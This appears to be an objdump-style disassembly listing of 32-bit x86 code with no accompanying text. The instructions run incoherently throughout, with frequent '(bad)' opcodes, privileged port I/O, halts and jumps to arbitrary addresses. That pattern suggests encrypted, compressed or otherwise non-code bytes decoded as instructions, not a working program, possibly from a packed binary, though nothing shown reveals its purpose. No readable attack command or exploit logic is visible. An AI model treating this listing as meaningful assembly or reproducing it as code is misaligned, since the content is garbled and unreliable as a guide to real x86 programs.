  41fb61:	or     bh,BYTE PTR [ecx-0x1a5ef459]
  41fb67:	cli    
  41fb68:	in     al,dx
  41fb69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb6a:	arpl   bx,sp
  41fb6c:	jno    0x41fb4c
  41fb6e:	sub    eax,DWORD PTR [edi]
  41fb70:	ins    DWORD PTR es:[edi],dx
  41fb71:	pop    eax
  41fb72:	xor    al,0x1
  41fb74:	ret    0xaed5
  41fb77:	push   ss
  41fb78:	pop    esp
  41fb79:	js     0x41fbf4
  41fb7b:	lods   al,BYTE PTR ds:[esi]
  41fb7c:	(bad)  
  41fb7d:	pop    ds
  41fb7e:	repnz add DWORD PTR [di+0x7b2e],ebx
  41fb84:	jecxz  0x41fb2a
  41fb86:	test   eax,0x3dd4f161
  41fb8b:	sahf   
  41fb8c:	push   edx
  41fb8d:	leave  
  41fb8e:	lahf   
  41fb8f:	inc    edx
  41fb90:	push   0x309c253c
  41fb95:	fsub   DWORD PTR [eax]
  41fb97:	fstp   TBYTE PTR [edx]
  41fb99:	jne    0x41fbbf
  41fb9b:	das    
  41fb9c:	das    
  41fb9d:	ins    BYTE PTR es:[edi],dx
  41fb9e:	inc    eax
  41fb9f:	or     DWORD PTR [ecx+0x3b05ef09],ebp
  41fba5:	into   
  41fba6:	sub    BYTE PTR [ecx],ah
  41fba8:	lock inc ebp
  41fbaa:	adc    al,BYTE PTR [eax-0x1d]
  41fbad:	repnz sub al,0xa0
  41fbb0:	aaa    
  41fbb1:	out    dx,eax
  41fbb2:	add    dh,BYTE PTR [edx-0x41]
  41fbb5:	rcr    DWORD PTR [ebx-0x2f],cl
  41fbb8:	jg     0x41fb5e
  41fbba:	outs   dx,DWORD PTR ds:[esi]
  41fbbb:	pop    ds
  41fbbc:	add    DWORD PTR [ecx],edi
  41fbbe:	mov    ebx,0x12a47b09
  41fbc3:	es jae 0x41fb69
  41fbc6:	xor    bh,cl
  41fbc8:	sbb    BYTE PTR [ebx],bh
  41fbca:	cmp    BYTE PTR [edx+0x40],bh
  41fbcd:	imul   esp,DWORD PTR [ebx+0x136b2616],0xf5c47017
  41fbd7:	test   al,0x8b
  41fbd9:	add    edi,edx
  41fbdb:	xchg   ecx,eax
  41fbdc:	mov    ds:0x495a4250,eax
  41fbe1:	hlt    
  41fbe2:	pop    ss
  41fbe3:	mov    eax,0x6859654f
  41fbe8:	pop    ss
  41fbe9:	sub    BYTE PTR [edi+esi*4+0x44],ah
  41fbed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbee:	(bad)  
  41fbef:	adc    cl,BYTE PTR [edx-0x48]
  41fbf2:	mov    al,BYTE PTR [edx+ebp*1-0x7557b77d]
  41fbf9:	push   0x9324aa1
  41fbfe:	sbb    BYTE PTR [esi-0x456de25c],bh
  41fc04:	jb     0x41fbfb
  41fc06:	add    al,dh
  41fc08:	scas   eax,DWORD PTR es:[edi]
  41fc09:	or     bl,bh
  41fc0b:	mov    dh,0x2
  41fc0d:	(bad)  
  41fc0e:	mov    al,ds:0x94d30354
  41fc13:	pop    es
  41fc14:	mov    edi,0xda0aac25
  41fc19:	mov    ch,0x4c
  41fc1b:	ror    al,0x70
  41fc1e:	fild   QWORD PTR [ecx+0x31352728]
  41fc24:	xchg   esp,eax
  41fc25:	out    dx,al
  41fc26:	mov    al,0x62
  41fc28:	inc    ebx
  41fc29:	fistp  DWORD PTR [ecx-0x3387bde4]
  41fc2f:	xchg   ebp,eax
  41fc30:	add    bl,BYTE PTR [edx]
  41fc32:	(bad)  
  41fc34:	mov    ch,0xd0
  41fc36:	test   DWORD PTR [edx-0x32],esp
  41fc39:	nop
  41fc3a:	fdivrp st(2),st
  41fc3c:	in     al,0xf4
  41fc3e:	jbe    0x41fc82
  41fc40:	(bad)  
  41fc41:	loop   0x41fc06
  41fc43:	addr16 push ebp
  41fc45:	neg    BYTE PTR [edi]
  41fc47:	add    ch,bl
  41fc49:	es repnz sub ecx,0x4e68869f
  41fc51:	jno    0x41fccf
  41fc53:	mov    bh,0xf5
  41fc55:	icebp  
  41fc56:	sub    bl,BYTE PTR [eax+0x5b6b1ec]
  41fc5c:	mov    dl,0x8e
  41fc5e:	add    al,BYTE PTR [esi-0x7e516d84]
  41fc64:	lock dec edx
  41fc66:	pop    edx
  41fc67:	pop    ss
  41fc68:	aam    0x2f
  41fc6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc6b:	push   es
  41fc6c:	test   DWORD PTR ds:0x15e17269,eax
  41fc72:	test   bh,cl
  41fc74:	push   es
  41fc75:	push   esp
  41fc76:	or     ebx,ebx
  41fc78:	aam    0x6e
  41fc7a:	cwde   
  41fc7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc7c:	mov    bl,dl
  41fc7e:	mov    esp,0xa5c23823
  41fc83:	mov    dh,0x5c
  41fc85:	ret    0x4830
  41fc88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc89:	and    cl,BYTE PTR [edi+edx*1]
  41fc8c:	jb     0x41fc85
  41fc8e:	mov    bh,0xed
  41fc90:	(bad)  
  41fc91:	jbe    0x41fc36
  41fc93:	ins    BYTE PTR es:[edi],dx
  41fc94:	call   0xe73ee8b7
  41fc99:	out    0xc5,eax
  41fc9b:	mov    bl,0xa3
  41fc9d:	stos   BYTE PTR es:[edi],al
  41fc9e:	jecxz  0x41fc2f
  41fca0:	jne    0x41fc3a
  41fca2:	dec    edx
  41fca3:	xchg   DWORD PTR [ebp+0x5f],ebp
  41fca6:	repnz sar BYTE PTR [edx],0xb9
  41fcaa:	or     DWORD PTR [edx],esi
  41fcac:	push   ebp
  41fcad:	cmp    edi,DWORD PTR [ebx]
  41fcaf:	push   es
  41fcb0:	shr    DWORD PTR ds:0xb448bdac,0xe1
  41fcb7:	outs   dx,BYTE PTR ds:[esi]
  41fcb8:	mov    esp,DWORD PTR [edx+0x56]
  41fcbb:	mov    al,ds:0x12f12874
  41fcc0:	push   ebp
  41fcc1:	inc    esi
  41fcc2:	pop    edx
  41fcc3:	dec    esi
  41fcc4:	mov    edx,0xe442ea3d
  41fcc9:	cdq    
  41fcca:	cmp    ebx,DWORD PTR [ecx]
  41fccc:	cmp    BYTE PTR [ebx],0x55
  41fccf:	sub    DWORD PTR [ecx],0xfffffffb
  41fcd2:	adc    ebx,DWORD PTR [eax]
  41fcd4:	adc    al,0xca
  41fcd6:	jnp    0x41fd2e
  41fcd8:	leave  
  41fcd9:	inc    edi
  41fcda:	mov    ah,0xed
  41fcdd:	and    eax,0x4705f1b4
  41fce2:	das    
  41fce3:	js     0x41fcf8
  41fce5:	(bad)  
  41fce6:	out    dx,al
  41fce7:	jno    0x41fd10
  41fce9:	adc    edx,ecx
  41fceb:	outs   dx,DWORD PTR ds:[esi]
  41fcec:	sub    dh,al
  41fcee:	out    0xc1,eax
  41fcf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcf1:	ins    BYTE PTR es:[edi],dx
  41fcf2:	popf   
  41fcf3:	pop    eax
  41fcf4:	fcmovnu st,st(2)
  41fcf6:	sar    BYTE PTR [ecx+0x73ae5027],1
  41fcfc:	sub    bl,BYTE PTR [ebx]
  41fcfe:	pusha  
  41fcff:	imul   ebp,edx,0x96b98067
  41fd05:	sub    dl,BYTE PTR [ebx+0x3b]
  41fd08:	push   edx
  41fd09:	ins    DWORD PTR es:[edi],dx
  41fd0a:	jae    0x41fcdf
  41fd0c:	cwde   
  41fd0d:	idiv   BYTE PTR [eax]
  41fd0f:	mov    ds:0x7b9e4d6e,eax
  41fd14:	arpl   WORD PTR [esi],dx
  41fd16:	in     eax,0x9
  41fd18:	pop    esi
  41fd19:	std    
  41fd1a:	adc    dh,BYTE PTR [eax+0x746b98f2]
  41fd20:	loop   0x41fd10
  41fd22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd23:	mov    esi,cs
  41fd25:	shr    BYTE PTR [eax+0x4df1e52d],1
  41fd2b:	sbb    ebx,DWORD PTR [eax+0x67bb32f9]
  41fd31:	cmp    BYTE PTR [ebx+0x3e],ah
  41fd34:	and    BYTE PTR [esi+0x69],0x91
  41fd38:	inc    edi
  41fd39:	nop
  41fd3a:	jo     0x41fd74
  41fd3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd3d:	and    DWORD PTR [eax],0x8cb61132
  41fd43:	mov    ebp,eax
  41fd45:	repnz call 0xdba4:0xbf6b243c
  41fd4d:	fcomip st,st(4)
  41fd4f:	sbb    bl,BYTE PTR [ebp+ebx*4+0x394ccc8]
  41fd56:	mov    edx,0x1c5eefbd
  41fd5b:	cmp    BYTE PTR [edx+0x74f137c9],0xb9
  41fd62:	imul   ebp,DWORD PTR [esi+0x44],0x7
  41fd66:	pop    ecx
  41fd67:	hlt    
  41fd68:	scas   al,BYTE PTR es:[edi]
  41fd69:	pushf  
  41fd6a:	pop    ebp
  41fd6b:	(bad)  
  41fd6c:	cmp    eax,edi
  41fd6e:	loopne 0x41fcf2
  41fd70:	or     esi,DWORD PTR [ebx+0x2b]
  41fd73:	xchg   BYTE PTR [ebx-0x46ad72b5],ah
  41fd79:	aaa    
  41fd7a:	pusha  
  41fd7b:	sub    edi,DWORD PTR [ebx-0x19]
  41fd7e:	mov    dl,0x31
  41fd80:	and    BYTE PTR [edi],al
  41fd82:	lock gs aad 0xcd
  41fd86:	mov    cl,0xf9
  41fd88:	dec    eax
  41fd89:	mov    al,0x83
  41fd8b:	xchg   BYTE PTR [esi+0x53],ah
  41fd8e:	push   ecx
  41fd8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd90:	mov    dh,0xd2
  41fd92:	pmullw mm6,QWORD PTR [ecx+0x4f]
  41fd96:	dec    ecx
  41fd97:	push   esi
  41fd98:	or     al,0x42
  41fd9a:	pop    ds
  41fd9b:	fbstp  TBYTE PTR [ebp+0x17]
  41fd9e:	mov    dl,0xcb
  41fda0:	shl    DWORD PTR [ecx+0x24c14812],cl
  41fda6:	adc    edx,esp
  41fda8:	and    al,0x52
  41fdaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdab:	scas   al,BYTE PTR es:[edi]
  41fdac:	(bad)  
  41fdae:	sub    ah,ah
  41fdb0:	add    esp,DWORD PTR [edx]
  41fdb2:	(bad)  
  41fdb3:	fisttp WORD PTR [esi+0x7b]
  41fdb6:	mov    edx,0x89fa24e2
  41fdbb:	or     dl,BYTE PTR [ecx-0x39]
  41fdbe:	pop    ds
  41fdbf:	sub    DWORD PTR [esi-0x73],0x58
  41fdc3:	arpl   WORD PTR [edx],dx
  41fdc5:	sti    
  41fdc6:	mov    eax,0xbde7b2d
  41fdcb:	pop    ebp
  41fdcc:	fimul  DWORD PTR [esi+0x72fc3434]
  41fdd2:	stos   BYTE PTR es:[edi],al
  41fdd3:	addr16 push 0x46
  41fdd6:	into   
  41fdd7:	fs inc ebx
  41fdd9:	xchg   ebx,eax
  41fdda:	cmp    edi,DWORD PTR [ebx+0x2d]
  41fddd:	cmp    edi,DWORD PTR [eax-0x52]
  41fde0:	or     eax,0x79e9fa4c
  41fde5:	xchg   esi,eax
  41fde6:	push   ecx
  41fde7:	pop    ebx
  41fde8:	push   ss
  41fde9:	iret   
  41fdea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdeb:	aam    0x9a
  41fded:	mov    bl,dh
  41fdef:	pop    ebx
  41fdf0:	adc    BYTE PTR [edi-0xc49cc72],al
  41fdf6:	int    0x18
  41fdf8:	test   DWORD PTR [eax+0x56],0x72287385
  41fdff:	inc    ebx
  41fe00:	popf   
  41fe01:	(bad)  
  41fe02:	loope  0x41fe5e
  41fe04:	cwde   
  41fe05:	add    BYTE PTR [ecx+0x24],0x5c
  41fe09:	shl    cl,0x23
  41fe0c:	push   ecx
  41fe0d:	jne    0x41fe7f
  41fe0f:	pushf  
  41fe10:	es xchg esi,eax
  41fe12:	arpl   WORD PTR [esi],bp
  41fe14:	loop   0x41fd98
  41fe16:	jno    0x41fdd8
  41fe18:	mov    bl,0x81
  41fe1a:	pop    ds
  41fe1b:	nop
  41fe1c:	adc    edx,DWORD PTR [eax+edi*1-0x5d0bec68]
  41fe23:	ss (bad) 
  41fe26:	jg     0x41fe39
  41fe28:	push   esp
  41fe29:	jle    0x41fe95
  41fe2b:	clc    
  41fe2c:	inc    esi
  41fe2d:	pop    esi
  41fe2e:	cmp    eax,0x78cb396d
  41fe33:	ret    0x9d61
  41fe36:	and    BYTE PTR [edx],al
  41fe38:	gs jecxz 0x41fe74
  41fe3b:	pop    edi
  41fe3c:	adc    dl,BYTE PTR [edx+0x2cc3a417]
  41fe42:	ins    DWORD PTR es:[edi],dx
  41fe43:	add    ebx,DWORD PTR ds:0x798e429d
  41fe49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe4a:	in     al,dx
  41fe4b:	nop
  41fe4c:	pop    ecx
  41fe4d:	adc    DWORD PTR [ecx+0x45],esp
  41fe50:	sbb    eax,0x1ba5c31
  41fe55:	fdivr  st,st(0)
  41fe57:	test   eax,edi
  41fe59:	fnsave [ebx-0x7d77c5f0]
  41fe5f:	clc    
  41fe60:	pop    ss
  41fe61:	daa    
  41fe62:	adc    al,0xcd
  41fe64:	jecxz  0x41fdf3
  41fe66:	cmp    al,0xa9
  41fe68:	push   ss
  41fe69:	imul   edi,DWORD PTR [edx-0x47],0x27
  41fe6d:	fdiv   DWORD PTR [esi+0x4c1a1234]
  41fe73:	fidivr DWORD PTR [edx-0x7bdefe6d]
  41fe79:	jmp    0xe6df07cc
  41fe7e:	pop    es
  41fe7f:	test   eax,0x11ea03e3
  41fe84:	imul   esp,DWORD PTR [esi+0x16],0xffffffb2
  41fe88:	jecxz  0x41fe48
  41fe8a:	popa   
  41fe8b:	out    0x70,al
  41fe8d:	and    al,0xbb
  41fe8f:	add    al,0xc3
  41fe91:	into   
  41fe92:	pop    ebp
  41fe93:	not    ah
  41fe95:	mov    cl,0x6c
  41fe97:	and    BYTE PTR [esi-0x6e],cl
  41fe9a:	or     al,0x98
  41fe9c:	sub    al,0x37
  41fe9e:	icebp  
  41fe9f:	shl    DWORD PTR ds:0x81334d54,1
  41fea5:	lods   eax,DWORD PTR ds:[esi]
  41fea6:	sbb    ecx,esp
  41fea8:	adc    ah,BYTE PTR [eax-0x58add193]
  41feae:	cmp    BYTE PTR [edx+0x6ac3e691],0xb8
  41feb5:	ss stc 
  41feb7:	mov    eax,0x661a7559
  41febc:	hlt    
  41febd:	repz pop edx
  41febf:	cmp    eax,0xa8b4badc
  41fec4:	pop    ebp
  41fec5:	jnp    0x41fe9c
  41fec7:	or     eax,0x76b2523a
  41fecc:	aas    
  41fecd:	rcr    DWORD PTR [edx],cl
  41fecf:	enter  0xfbad,0xb6
  41fed3:	pop    edx
  41fed4:	jb     0x41fe5e
  41fed6:	jnp    0x41ff45
  41fed8:	add    dl,BYTE PTR [ecx]
  41feda:	dec    esp
  41fedb:	shl    DWORD PTR [ecx*1+0xa009276],cl
  41fee2:	ins    BYTE PTR es:[edi],dx
  41fee3:	push   edi
  41fee4:	daa    
  41fee5:	in     al,0xab
  41fee7:	stc    
  41fee8:	sub    DWORD PTR [ecx+0x42],eax
  41feeb:	test   al,0x57
  41feed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feee:	fs jne 0x41fef4
  41fef1:	mov    ds:0xb2771f4f,eax
  41fef6:	inc    edi
  41fef7:	xor    DWORD PTR [ebx+0x173c9849],ecx
  41fefd:	cmp    BYTE PTR [edi-0x59affb6f],ch
  41ff03:	cli    
  41ff04:	cmp    ecx,edx
  41ff06:	jmp    0x41ff7e
  41ff08:	adc    eax,DWORD PTR [esi]
  41ff0a:	in     eax,dx
  41ff0b:	retf   
  41ff0c:	aaa    
  41ff0d:	rcl    BYTE PTR [ecx-0x26e1fc83],0x42
  41ff14:	(bad)  
  41ff15:	xchg   esp,eax
  41ff16:	inc    ecx
  41ff17:	and    esi,DWORD PTR [edx]
  41ff19:	push   DWORD PTR [eax+0x4c]
  41ff1c:	sbb    edx,ebx
  41ff1e:	mov    edx,0xd6c743cb
  41ff23:	adc    DWORD PTR [esi],edi
  41ff25:	loope  0x41ff09
  41ff27:	mov    bh,0x71
  41ff29:	in     eax,dx
  41ff2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff2b:	lods   al,BYTE PTR ds:[esi]
  41ff2c:	repnz fadd DWORD PTR [edi]
  41ff2f:	sbb    eax,0x2947daf7
  41ff34:	and    BYTE PTR [ecx],0xaa
  41ff37:	xchg   ebp,eax
  41ff38:	ds stos BYTE PTR es:[edi],al
  41ff3a:	cs xchg ebp,eax
  41ff3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff3d:	adc    ch,BYTE PTR [eax+0x7c6c9085]
  41ff43:	mov    ebp,DWORD PTR [esi-0x5f]
  41ff46:	xor    al,0x7a
  41ff48:	mov    edx,0x82e062
  41ff4d:	push   0x9f91cf8
  41ff52:	into   
  41ff53:	add    BYTE PTR [ecx+0x57],cl
  41ff56:	fmul   DWORD PTR [edx+0x13]
  41ff59:	mov    BYTE PTR [ebx],bh
  41ff5b:	popa   
  41ff5c:	and    DWORD PTR [ebx-0x33],edi
  41ff5f:	aaa    
  41ff60:	stos   DWORD PTR es:[edi],eax
  41ff61:	sbb    ah,BYTE PTR [ebx-0x36]
  41ff64:	(bad)  
  41ff65:	ins    DWORD PTR es:[edi],dx
  41ff66:	adc    ecx,ebp
  41ff68:	fisub  WORD PTR [ebx]
  41ff6a:	stc    
  41ff6b:	out    0x14,al
  41ff6d:	ins    DWORD PTR es:[edi],dx
  41ff6e:	xchg   ecx,eax
  41ff6f:	in     al,0xcc
  41ff71:	xor    esi,DWORD PTR [ebp+0x4]
  41ff74:	lds    esi,FWORD PTR [edx-0x63611351]
  41ff7a:	or     DWORD PTR [edi-0x1f],ebp
  41ff7d:	cwde   
  41ff7e:	lahf   
  41ff7f:	pop    ebp
  41ff80:	mov    esp,0xc25c1086
  41ff85:	mov    ah,0xf8
  41ff87:	sbb    esp,esp
  41ff89:	jne    0x41ffb5
  41ff8b:	or     DWORD PTR [esi+0x64],ecx
  41ff8e:	mov    ebx,DWORD PTR [ebx+0x15850386]
  41ff94:	ja     0x41ffdf
  41ff96:	adc    al,0xd4
  41ff98:	xor    al,ch
  41ff9a:	or     eax,0x51ebd539
  41ff9f:	jg     0x41fff2
  41ffa1:	and    DWORD PTR [edx-0x63],ebx
  41ffa4:	cwde   
  41ffa5:	lock mov ebp,fs
  41ffa8:	or     bl,BYTE PTR [ecx+0x43]
  41ffab:	inc    esi
  41ffac:	call   0x4740a34d
  41ffb1:	rcl    DWORD PTR [edi],cl
  41ffb3:	add    esi,ebp
  41ffb5:	push   ss
  41ffb6:	mov    esi,ecx
  41ffb8:	dec    eax
  41ffb9:	dec    ecx
  41ffba:	sbb    BYTE PTR [edi-0x3d0b7128],al
  41ffc0:	and    dh,BYTE PTR [ebx+eiz*2+0x10]
  41ffc4:	test   al,0x60
  41ffc6:	test   al,0x2d
  41ffc8:	out    dx,eax
  41ffc9:	(bad)  
  41ffca:	out    dx,eax
  41ffcb:	mov    eax,0xfe3644d5
  41ffd0:	jmp    0x41ffed
  41ffd2:	fwait
  41ffd3:	sub    DWORD PTR [ebp+0x33],0xffffffb3
  41ffd7:	out    0x34,eax
  41ffd9:	icebp  
  41ffda:	stos   BYTE PTR es:[edi],al
  41ffdb:	aaa    
  41ffdc:	xchg   ebp,eax
  41ffdd:	xchg   edx,eax
  41ffde:	lock imul ebx,DWORD PTR [esi+0x5622f568],0x280de635
  41ffe9:	mov    ebx,DWORD PTR [esi-0x45]
  41ffec:	xor    ch,ch
  41ffee:	or     eax,0x2cd01414
  41fff3:	js     0x41ffe7
  41fff5:	hlt    
  41fff6:	mov    al,0xa8
  41fff8:	out    0x2c,al
  41fffa:	test   DWORD PTR [edi-0x4a],ecx
  41fffd:	pop    es
  41fffe:	inc    ebp
  41ffff:	cmc    
  420000:	pop    esp
  420001:	mov    eax,ds:0xb998ad88
  420006:	and    DWORD PTR [eax],ebx
  420008:	adc    DWORD PTR [eax],0x600e3469
  42000e:	fwait
  42000f:	adc    BYTE PTR [eax],al
  420011:	jl     0x420028
  420013:	imul   edx,DWORD PTR ds:0x5758ba95,0x8341b35f
  42001d:	fnstsw WORD PTR [esi+0x77]
  420020:	loopne 0x42002b
  420022:	aas    
  420023:	add    al,0x2f
  420025:	xor    al,0xd4
  420027:	into   
  420028:	adc    BYTE PTR [ebx],cl
  42002a:	rcl    dh,1
  42002c:	inc    esp
  42002d:	xchg   BYTE PTR [edi+0x50b082e3],dl
  420033:	mov    bh,0x30
  420035:	mov    edi,0x2cb59442
  42003a:	rol    BYTE PTR [ebx-0x74],cl
  42003d:	push   esp
  42003e:	dec    esi
  42003f:	jae    0x420036
  420041:	outs   dx,DWORD PTR ds:[esi]
  420042:	mov    ds:0x4b2a4687,al
  420047:	sbb    al,0x70
  420049:	or     esi,DWORD PTR [ebx+ebp*2]
  42004c:	(bad)  
  42004d:	xor    ebp,DWORD PTR [edi]
  42004f:	adc    DWORD PTR ds:0x4bce477d,edx
  420055:	xor    BYTE PTR ds:[ebp-0x3da19b19],bl
  42005c:	test   DWORD PTR [ecx-0xd53ceb1],esi
  420062:	push   0x53
  420064:	mov    esi,0xc110defd
  420069:	mov    ds:0x6a69e266,eax
  42006e:	jb     0x41fffd
  420070:	inc    esp
  420071:	xchg   esi,eax
  420072:	in     eax,0x0
  420074:	dec    ebx
  420075:	mov    ss,WORD PTR [ecx]
  420077:	mov    bl,0xf2
  420079:	mov    esp,0xa451b5c
  42007e:	sbb    al,BYTE PTR [ecx+0xb9c831d]
  420084:	inc    DWORD PTR [edi+0x34]
  420087:	pop    eax
  420088:	fdivr  st,st(4)
  42008a:	push   ds
  42008b:	mov    ds:0x2f2f84c1,eax
  420090:	jb     0x420088
  420092:	aam    0xa1
  420094:	adc    al,0x88
  420096:	lahf   
  420097:	loopne 0x420064
  420099:	mov    BYTE PTR [ebx],dl
  42009b:	mov    BYTE PTR [esi+0x2b8d6f03],dl
  4200a1:	push   0x4d28d19e
  4200a6:	lea    ebp,[edx-0x40]
  4200a9:	or     al,dl
  4200ab:	jnp    0x420065
  4200ad:	mov    dh,0x44
  4200af:	cmp    BYTE PTR [edx+0x5d],ch
  4200b2:	sbb    bh,BYTE PTR [ebx]
  4200b4:	xchg   edx,eax
  4200b5:	mov    esi,0x3298cb63
  4200ba:	jg     0x42012c
  4200bc:	xchg   esp,eax
  4200bd:	test   BYTE PTR [eax],0x1c
  4200c0:	hlt    
  4200c1:	call   0x4cd86817
  4200c6:	repz out dx,al
  4200c8:	jl     0x420083
  4200ca:	and    al,0x99
  4200cc:	xor    al,0x78
  4200ce:	loopne 0x42011e
  4200d0:	jecxz  0x4200d6
  4200d2:	gs push cs
  4200d4:	sbb    al,0x5c
  4200d6:	out    dx,eax
  4200d7:	and    al,0x5c
  4200d9:	shl    dl,0xa
  4200dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200dd:	mov    cl,0x1
  4200df:	mov    ecx,0x3ca923bc
  4200e4:	jecxz  0x4200d5
  4200e6:	rcr    DWORD PTR [edx-0x437e2423],1
  4200ec:	(bad)  
  4200ed:	fnstcw WORD PTR [edx+0x36]
  4200f0:	jbe    0x420148
  4200f2:	das    
  4200f3:	idiv   eax
  4200f5:	shl    BYTE PTR [edx+0x543edf2c],0x3b
  4200fc:	inc    esp
  4200fd:	inc    ebp
  4200fe:	fisub  DWORD PTR [esi-0x58]
  420101:	cmp    eax,0x444701e4
  420106:	or     bl,BYTE PTR [edi+ebp*4]
  420109:	adc    al,0x51
  42010b:	or     ah,BYTE PTR [ebx+0x3830b1b1]
  420111:	jbe    0x420149
  420113:	jmp    0xae93aa6b
  420118:	ret    
  420119:	dec    eax
  42011a:	cmp    al,0x36
  42011c:	fist   DWORD PTR [esi-0x6d]
  42011f:	js     0x4200d3
  420121:	addr16 (bad) 
  420123:	lock xor ch,BYTE PTR [eax-0x5c]
  420127:	hlt    
  420128:	jmp    0x42018e
  42012a:	ja     0x42016b
  42012c:	(bad)  
  42012d:	pop    eax
  42012e:	mov    DWORD PTR [edx],ebp
  420130:	fdiv   QWORD PTR [ebx-0x2060590b]
  420136:	inc    ecx
  420137:	jg     0x4201b4
  420139:	xchg   ebp,eax
  42013a:	hlt    
  42013b:	pop    eax
  42013c:	add    DWORD PTR [eax],0xf042bd77
  420142:	dec    BYTE PTR [esi+0x37098dd9]
  420148:	rcl    BYTE PTR [ecx+0x5fb52c8d],0x86
  42014f:	mov    al,ch
  420151:	xchg   ebx,eax
  420152:	(bad)  
  420153:	sub    DWORD PTR [edx-0x4f],edi
  420156:	jne    0x42011a
  420158:	push   ss
  420159:	inc    DWORD PTR [edx+0x28c0e8]
  42015f:	push   cs
  420160:	mov    ds:0x9edfc8ec,al
  420165:	adc    dh,cl
  420167:	dec    ecx
  420168:	sbb    ebp,ecx
  42016a:	or     DWORD PTR [si-0x9],ebp
  42016e:	fs in  eax,dx
  420170:	(bad)  
  420172:	push   ebp
  420173:	cdq    
  420174:	popf   
  420175:	pop    edx
  420176:	ror    DWORD PTR [edi+ebp*1-0x77e27418],0x12
  42017e:	clc    
  42017f:	or     bl,BYTE PTR [eax-0x7300cf]
  420185:	pop    edx
  420186:	xchg   DWORD PTR [ecx+0x7cd814a0],edi
  42018c:	push   ebx
  42018d:	stos   BYTE PTR es:[edi],al
  42018e:	out    0x1a,eax
  420190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420191:	lock xchg ax,ax
  420194:	stc    
  420195:	dec    esi
  420196:	in     eax,0xe
  420198:	ret    0x2fa9
  42019b:	inc    esi
  42019c:	loope  0x420172
  42019e:	cli    
  42019f:	enter  0x6b34,0x10
  4201a3:	mov    ?,WORD PTR [esi]
  4201a5:	jbe    0x42019c
  4201a7:	data16 arpl dx,dx
  4201aa:	inc    edx
  4201ab:	sahf   
  4201ac:	popa   
  4201ad:	xor    al,ch
  4201af:	xor    esi,esi
  4201b1:	fisubr DWORD PTR es:[eax]
  4201b4:	pop    ss
  4201b5:	mov    al,cs:0x7ea0e84
  4201bb:	icebp  
  4201bc:	pop    edx
  4201bd:	or     ah,al
  4201bf:	pop    eax
  4201c1:	ins    DWORD PTR es:[edi],dx
  4201c2:	xchg   ecx,eax
  4201c3:	sbb    BYTE PTR [edi],bl
  4201c5:	into   
  4201c6:	mov    dh,0x63
  4201c8:	sub    DWORD PTR ds:0x116e872d,edi
  4201ce:	and    DWORD PTR [edx-0x7],0xfffffff5
  4201d2:	into   
  4201d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201d4:	dec    esi
  4201d5:	enter  0xb7c,0x74
  4201d9:	cwde   
  4201da:	loop   0x420173
  4201dc:	xchg   DWORD PTR [ebp+0x48],ebp
  4201df:	retf   
  4201e0:	cmp    al,0xb9
  4201e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201e3:	imul   ebx,ebp,0xffffffc8
  4201e6:	sub    bl,bh
  4201e8:	aam    0xf3
  4201ea:	(bad)  
  4201eb:	mov    dl,0x5e
  4201ed:	xchg   ebp,eax
  4201ee:	jl     0x4201fe
  4201f0:	pushf  
  4201f1:	pop    edx
  4201f2:	sub    dh,BYTE PTR [ebx]
  4201f4:	and    cl,ch
  4201f6:	in     al,dx
  4201f7:	loopne 0x42019a
  4201f9:	add    BYTE PTR [ebx-0x25dcc1c1],dh
  4201ff:	out    dx,al
  420200:	cwde   
  420201:	inc    ebp
  420202:	mov    al,0xb6
  420204:	out    0x5b,al
  420206:	out    dx,al
  420207:	adc    DWORD PTR [ebx+0x5d],0x54394e31
  42020e:	inc    edx
  42020f:	sub    edi,DWORD PTR [edi*1-0x41655056]
  420216:	in     al,dx
  420217:	xchg   esp,eax
  420218:	pop    ecx
  420219:	repnz xchg esp,eax
  42021b:	jmp    0x9d029e
  420220:	js     0x420242
  420222:	dec    esp
  420223:	mov    ebx,0x4c27ec82
  420228:	outs   dx,BYTE PTR ds:[esi]
  420229:	mov    ebx,0xebad9d9c
  42022e:	sub    bl,BYTE PTR [eax+edx*4+0x1513395a]
  420235:	loopne 0x4202a4
  420237:	test   al,0x13
  420239:	push   edx
  42023a:	mov    ah,0xf2
  42023c:	mov    ecx,0xb8075543
  420241:	adc    bl,BYTE PTR [esp+edi*8-0x59]
  420245:	xor    esi,DWORD PTR [ebx+eiz*8+0x45bf722e]
  42024c:	push   edx
  42024d:	add    ah,BYTE PTR [edx+eax*2]
  420250:	cmp    DWORD PTR [ebx],ebx
  420252:	mov    eax,DWORD PTR [ebx+0x137833b4]
  420258:	push   eax
  420259:	cmp    BYTE PTR ds:0x7ca9d567,bh
  42025f:	dec    eax
  420260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420261:	mov    dh,0x22
  420263:	in     eax,0x9c
  420265:	push   0xa3f22c25
  42026a:	push   esp
  42026b:	repnz out 0xa1,eax
  42026e:	(bad)  
  42026f:	lahf   
  420270:	jg     0x42027a
  420272:	(bad)  
  420273:	in     eax,dx
  420274:	enter  0x7e16,0x44
  420278:	jg     0x420241
  42027a:	fiadd  WORD PTR ds:0x5e012f7
  420280:	sbb    ah,ah
  420282:	daa    
  420283:	sahf   
  420284:	jmp    0x4202a6
  420286:	mov    bl,0x34
  420288:	or     BYTE PTR [edi],ch
  42028a:	(bad)  
  42028b:	mov    edx,0xc972e03a
  420290:	dec    ecx
  420291:	cwde   
